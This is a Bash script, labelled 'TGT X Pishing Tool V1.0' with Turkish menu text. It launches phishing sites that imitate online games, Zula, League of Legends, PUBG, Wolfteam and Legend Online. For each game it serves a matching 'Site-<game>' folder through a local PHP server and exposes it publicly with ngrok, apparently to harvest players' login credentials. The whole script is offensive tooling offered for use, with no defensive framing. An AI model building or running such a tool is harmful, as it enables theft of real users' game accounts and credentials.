#!/bin/bash
#Turkish Guy Tim

clear
echo -e  "\e[31m
 ______________________   __   __
 |__   __/ __ _|__   __|  \ \ / /
    | | | |  __   | |      \ V / 
 \e[37m   | | | | |_ |  | |       > <    Game \e[31m
    | | | |__| |  | |      / . \ 
    |_|  \_____|  |_|     /_/ \_\
	
    \e[32m=============================                          
   \e[36m                                             İletişim && Sosyal Medya
   \e[31m                                         ###############################
       \e[37m      Coder:  Alyx   	            \e[31m| Youtube:  ♛\e[32m Turkish Guy Tim\e[31m ♛
    \e[31m     /♛ Turkish Guy Tim ♛\              \e[31m| Web Site: ♛\e[32m Turkish Guy Tim\e[31m ♛
                                            \e[31m| Discord:  ♛\e[32m  .gg/e8ruugKW \e[31m  ♛
         \e[33m TGT X Pishing Tool V1.0    \e[31m	    ###############################


\e[31m===========================================|
\e[31m|[01]\e[32m Zula  \e[31m| \e[31m[04]\e[32m Wolfteam                \e[31m|
\e[31m|[02]\e[32m LoL   \e[31m| \e[31m[05]\e[32m Legend Online           \e[31m|
\e[31m|[03]\e[32m Pubg  \e[31m|                              \e[31m|  
\e[31m===========================================|


\e[31m[00]\e[37m Menü
\e[31m[99]\e[37m Exit
"
echo -e "\e[31m"
read -p "| Numara Seçiniz:" islem
if [[ $islem == 4 || $islem == 04 ]]; then
	read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: wolfteam"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-wolfteam/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 5 || $islem == 05 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: legend"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-legend/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 3 || $islem == 03 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: pubg"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-pubg/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Port Giriniz: " port 
	echo -e "\e[32mCode: zula"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-zula/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 2 || $islem == 02 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: lol"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-lol/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 0 || $islem == 00 ]]; then
cd ..
cd ..
bash tgtx.sh
elif [[ $islem == 9 || $islem == 99 ]]; then
clear
echo -e "\e[31mTurkish Guy Tim İyi Günler Dİler :)"
exit 1
else
echo ""
echo -e "\e[31m Girdiğiniz İşlem Numarasını Kontrol Ediniz...."
sleep 3
clear
bash Game.sh
fi
